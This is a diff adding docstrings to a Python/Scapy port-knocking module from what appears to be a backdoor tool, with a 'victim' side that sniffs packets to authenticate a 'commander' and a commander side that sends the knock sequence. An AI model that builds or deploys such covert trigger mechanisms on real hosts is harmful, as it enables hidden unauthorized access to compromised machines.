@@ -10,6 +10,15 @@ commander = False
 #### FOR Victim ####
 ########################
 def port_knocking(victim_ip):
+    """
+    Perform port knocking on the victim side to authenticate the commander.
+
+    Args:
+        victim_ip (str): IP address of the victim.
+
+    Returns:
+        tuple: IP address and port number if successful, None otherwise.
+    """
     potential_commanders = {}
     while True:
         packet = sniff(filter=f"tcp and dst {victim_ip}", count=1)[0]
@@ -47,17 +56,35 @@ def port_knocking(victim_ip):
         # Wait for the next packet
         time.sleep(0.1)
 
-
-
 ########################
 #### FOR COMMANDER ####
 ########################
 def send_knock(ip, port):
+    """
+    Send a knock packet to the victim.
+
+    Args:
+        ip (str): IP address of the victim.
+        port (int): Port number for the knock.
+
+    Returns:
+        None
+    """
     packet = IP(dst=ip)/TCP(dport=port)
     print("PACKET", packet)
     send(packet, verbose=False)
 
 def perform_knock_sequence(ip, time_out):
+    """
+    Perform the port knocking sequence on the victim.
+
+    Args:
+        ip (str): IP address of the victim.
+        time_out (int): Time to wait between knocks.
+
+    Returns:
+        None
+    """
     for port in knock_ports:
         send_knock(ip, port)
         time.sleep(time_out)
